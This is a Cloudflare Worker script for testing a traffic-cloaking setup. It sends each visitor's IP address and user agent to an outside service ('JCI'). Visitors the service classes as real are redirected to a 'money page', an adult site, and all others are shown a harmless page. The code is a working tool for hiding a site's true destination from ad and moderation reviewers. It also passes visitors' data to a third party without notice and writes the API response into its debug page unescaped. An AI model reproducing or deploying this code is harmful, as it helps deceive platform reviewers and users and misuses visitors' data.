// SIMPLE TEST WORKER - No external logging, just JCI API test
// This worker shows JCI API results directly on the page

const JCI_USER_ID = 'e68rqs0to5i24lfzpov5je9mr';
const MONEY_URL = 'https://www.xnxx.com';

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const visitorIP = request.headers.get('CF-Connecting-IP') || 'unknown';
  const userAgent = request.headers.get('User-Agent') || 'Mozilla/5.0 (compatible; CloudflareWorker/1.0)';
  
  let debugInfo = {
    ip: visitorIP,
    userAgent: userAgent,
    domain: new URL(request.url).hostname,
    timestamp: new Date().toISOString()
  };
  
  try {
    // Call JCI API using CORRECT format
    const jciUrl = `https://jcibj.com/lapi/rest/r/${JCI_USER_ID}/${encodeURIComponent(visitorIP)}/${encodeURIComponent(userAgent)}`;
    
    const jciResponse = await fetch(jciUrl, {
      method: 'GET',
      headers: {
        'User-Agent': userAgent,
        'Accept': 'application/json'
      }
    });
    
    if (!jciResponse.ok) {
      throw new Error(`JCI API returned status ${jciResponse.status}`);
    }
    
    const jciData = await jciResponse.json();
    debugInfo.jciSuccess = true;
    debugInfo.jciData = jciData;
    
    // Check if should redirect to money page
    if (jciData.type === 'false') {
      debugInfo.decision = 'MONEY_PAGE';
      debugInfo.action = 'Redirecting to money page';
      
      // Add debug info to redirect URL for testing
      const redirectUrl = new URL(MONEY_URL);
      redirectUrl.searchParams.set('jci_test', 'passed');
      redirectUrl.searchParams.set('worker_ip', visitorIP);
      
      return Response.redirect(redirectUrl.toString(), 302);
    } else {
      debugInfo.decision = 'SAFE_PAGE';
      debugInfo.action = 'Showing safe page';
      debugInfo.blockReason = jciData.reason || 'JCI blocked';
    }
    
  } catch (error) {
    debugInfo.jciSuccess = false;
    debugInfo.jciError = error.message;
    debugInfo.decision = 'SAFE_PAGE';
    debugInfo.action = 'Error - showing safe page';
  }
  
  // Show debug page with all information
  const debugHtml = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JCI Worker Debug Test</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #1a1a1a;
            color: #00ff00;
            padding: 20px;
            line-height: 1.6;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: #2a2a2a;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #00ff00;
        }
        h1 {
            color: #00ffff;
            text-align: center;
            margin-bottom: 30px;
        }
        .status {
            font-size: 18px;
            font-weight: bold;
            margin-bottom: 20px;
            padding: 10px;
            border-radius: 5px;
        }
        .success { background: #004400; color: #00ff00; }
        .error { background: #440000; color: #ff4444; }
        .info { background: #003344; color: #00ccff; }
        pre {
            background: #000;
            color: #fff;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            white-space: pre-wrap;
        }
        .highlight {
            background: #ffff00;
            color: #000;
            padding: 2px 4px;
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🧪 JCI Worker Debug Test</h1>
        
        <div class="status ${debugInfo.jciSuccess ? 'success' : 'error'}">
            ${debugInfo.jciSuccess ? '✅ JCI API Call Successful' : '❌ JCI API Call Failed'}
        </div>
        
        <div class="status info">
            🎯 Decision: <span class="highlight">${debugInfo.decision}</span><br>
            🔧 Action: ${debugInfo.action}
        </div>
        
        <h3>📊 Debug Information:</h3>
        <pre>${JSON.stringify(debugInfo, null, 2)}</pre>
        
        ${debugInfo.jciSuccess ? `
        <h3>📡 JCI API Response:</h3>
        <pre>${JSON.stringify(debugInfo.jciData, null, 2)}</pre>
        
        <div class="status info">
            <strong>JCI Logic Test:</strong><br>
            • type = "${debugInfo.jciData.type}"<br>
            • Expected: type="false" → Money Page, type="true" → Safe Page<br>
            • Result: ${debugInfo.jciData.type === 'false' ? 'MONEY PAGE' : 'SAFE PAGE'}
        </div>
        ` : `
        <div class="status error">
            ❌ JCI API Error: ${debugInfo.jciError}
        </div>
        `}
        
        <div style="margin-top: 30px; text-align: center; font-size: 12px; opacity: 0.7;">
            Worker Version: simple-test-1.0 | ${debugInfo.timestamp}
        </div>
    </div>
</body>
</html>`;

  return new Response(debugHtml, {
    headers: { 
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-cache, no-store, must-revalidate',
      'X-Worker-Status': 'debug-test'
    }
  });
} 